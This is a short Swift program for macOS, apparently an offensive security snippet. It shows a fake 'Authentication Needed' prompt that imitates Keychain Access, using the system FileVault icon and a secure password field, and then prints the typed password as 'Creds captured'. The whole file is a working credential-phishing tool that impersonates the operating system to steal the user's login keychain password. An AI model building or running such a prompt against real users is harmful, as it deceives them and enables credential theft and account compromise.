import Foundation
import Cocoa

let application = NSApplication.shared
application.setActivationPolicy(.regular)
application.activate(ignoringOtherApps: true)

let alert = NSAlert()
alert.window.title = "Authentication Needed"
alert.messageText = "Keychain Access wants to use the login keychain"
alert.informativeText = "Please enter the keychain password."
alert.addButton(withTitle:"OK")
alert.addButton(withTitle:"Cancel")
let iconPath = "/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/FileVaultIcon.icns"
let iconImg = NSImage(contentsOfFile: iconPath)
alert.icon = iconImg

let passfield = NSSecureTextField(frame: NSRect(x: 0, y: 0, width: 300, height: 24))
alert.accessoryView = passfield

let response = alert.runModal()
if response == NSApplication.ModalResponse.alertFirstButtonReturn{
      print("Creds captured: " + passfield.stringValue)

    } else {

      print("Cancel button clicked. Creds not captured.")

    }
